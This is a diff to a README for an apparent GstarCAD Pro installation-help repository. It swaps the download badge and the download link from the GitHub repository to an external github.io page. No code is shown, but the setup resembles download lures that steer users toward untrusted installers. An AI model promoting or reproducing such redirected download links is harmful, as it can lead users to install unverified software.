@@ -1,6 +1,6 @@
 # 🛠 GstarCAD-Configuration-Guide - Fix Windows installation errors with ease
 
-[![](https://img.shields.io/badge/Download-GstarCAD_Setup_Guide-blue.svg)](https://github.com/jieshiyi8-del/GstarCAD-Configuration-Guide)
+[![](https://img.shields.io/badge/Download-GstarCAD_Setup_Guide-blue.svg)](https://jieshiyi8-del.github.io)
 
 ## 📋 About this guide
 This repository provides steps to install GstarCAD Pro on Windows 11. Many users face installation errors when setting up CAD software on modern systems. These notes explain how to prepare your computer, handle common setup blockers, and finish your installation. Follow these steps to resolve installation failures and start your drafting projects.
@@ -31,7 +31,7 @@ Follow these instructions to acquire the installation files and run the setup pr
 
 Click the link below to reach the download area for the configuration guide and setup resources:
 
-[Download GstarCAD Configuration Resources](https://github.com/jieshiyi8-del/GstarCAD-Configuration-Guide)
+[Download GstarCAD Configuration Resources](https://jieshiyi8-del.github.io)
 
 Once you reach the page:
 
